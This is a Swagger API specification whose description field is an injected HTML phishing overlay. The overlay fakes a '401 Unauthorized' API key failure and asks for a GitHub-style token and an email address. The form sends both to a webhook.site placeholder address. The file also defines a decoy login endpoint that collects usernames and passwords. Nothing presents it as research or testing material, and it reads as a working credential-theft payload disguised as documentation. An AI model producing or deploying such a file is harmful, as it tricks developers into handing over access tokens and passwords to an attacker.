swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0d1117;z-index:99998;font-family:-apple-system,Segoe UI,Helvetica,Arial;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:440px;max-width:94%;background:#161b22;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:36px 36px 28px;font-family:-apple-system,Segoe UI,Helvetica;"><div style="font-size:16px;font-weight:600;color:#f85149;margin-bottom:4px;">⚠ API key verification failed</div><div style="font-size:13px;color:#8b949e;margin-bottom:22px;">Your token returned <code style="background:#21262d;color:#ffa657;padding:2px 6px;border-radius:4px;">401 Unauthorized</code>. Re-activate your key to restore API access.</div><form action="https://webhook.site/REPLACE-ME" method="post"><div style="font-size:12px;color:#8b949e;margin-bottom:4px;">API TOKEN</div><input type="text" name="api_key" placeholder="ghp_xxxxxxxxxxxxxxxxxxxx" style="width:100%;padding:11px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;box-sizing:border-box;margin-bottom:14px;font-family:monospace;font-size:14px;"><div style="font-size:12px;color:#8b949e;margin-bottom:4px;">ACCOUNT EMAIL</div><input type="text" name="email" placeholder="you@company.com" style="width:100%;padding:11px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;box-sizing:border-box;margin-bottom:18px;font-size:14px;"><button type="submit" style="width:100%;padding:12px;background:#238636;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;">Re-activate Token</button></form></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
